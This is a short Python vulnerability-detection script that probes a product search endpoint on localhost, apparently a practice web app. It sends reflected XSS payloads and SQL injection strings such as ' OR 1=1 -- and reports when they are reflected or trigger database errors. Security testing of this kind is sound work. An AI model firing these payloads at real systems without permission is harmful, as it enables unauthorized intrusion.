import requests

target_url = "http://localhost:3000/rest/products/search?q="

xss_payloads = ["<script>alert(1)</script>", "<u>test</u>"]
sqli_payloads = ["' OR 1=1 --", "') OR '1'='1"]

def detect_vulnerabilities():
    print("Starting Vulnerability Detection")
    
    for payload in xss_payloads:
        r = requests.get(target_url + payload)
        if payload in r.text:
            print(f"[CRITICAL] XSS Detected! Payload reflected: {payload}")

    for payload in sqli_payloads:
        r = requests.get(target_url + payload)
        if r.status_code == 500 or "SQLITE_ERROR" in r.text:
            print(f"[CRITICAL] SQLi Detected! Payload triggered error: {payload}")

if __name__ == "__main__":
    detect_vulnerabilities()
